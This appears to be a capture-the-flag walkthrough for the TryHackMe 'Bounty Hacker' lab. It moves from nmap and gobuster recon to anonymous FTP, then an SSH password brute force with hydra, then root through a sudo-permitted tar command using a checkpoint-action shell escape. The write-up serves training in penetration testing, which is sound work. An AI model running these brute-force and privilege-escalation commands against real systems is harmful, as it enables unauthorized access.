# recon
nmap shows us that there are 3 open ports
- 21/tcp open  ftp
  - ftp-anon: Anonymous FTP login allowed (FTP code 230)
- 22/tcp open  ssh
- 80/tcp open  http
  - Apache/2.4.18 (Ubuntu)
let run gobuster for directory brute forcing.
```
$ gobuster dir -u http://$IP/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
```
in the meanwhile we waiting for gobuster result we can exaiming FTP port. Note that the FTP port is open for `Anonymous` login. what do it mean? yes, we can log in to FTP using `Anonymous` as username and password is not needed!
```
$ ftp $IP
```
use `ls` to list the file on the ftp. There are 2 files here. To get the file, run: `get <filename>`. Get both file to our kali so we can examing it.

as mention there are 2 files:
1. locks.txt: this file looks like a password/wordlist. We might be able to use it for brute forcing 
2. task.txt: a to do list wrote by *lin*

What we have at this point is username=`lin` as passwords in `locks.txt`. Now you can for get about gobuster... we already got something really juicy here. Let get foot hold on the victim server.

# foothold
now let brute force ssh to get a foot hold on the victim server. We will use hydra to performe ssh brute forcing. If you dont know how hydra works. There is really good room on tryhackme that teaching you how to use hydra. so pls check it out
```console
$ hydra -f -l lin -P locks.txt $IP -t 64 ssh
```
Boom ! we got the password. now ssh to the victim server and go grab the user flag.

# root
we will start with checking what Lin allow to run super user by running `sudo -l`.
```console
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
As you see, we are allow to use run `tar` as root. When you see this, the first think need to do is visit `GTFObins` ([link](https://gtfobins.github.io/)) and search for tar (link [here](https://gtfobins.github.io/gtfobins/tar/)) you can go script kiddez style and copy and paste the code under `#sudo` to gain root or read more about how it works by do more research about it.

anyhow, here is what we do.
```console
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cat /root/root.txt
```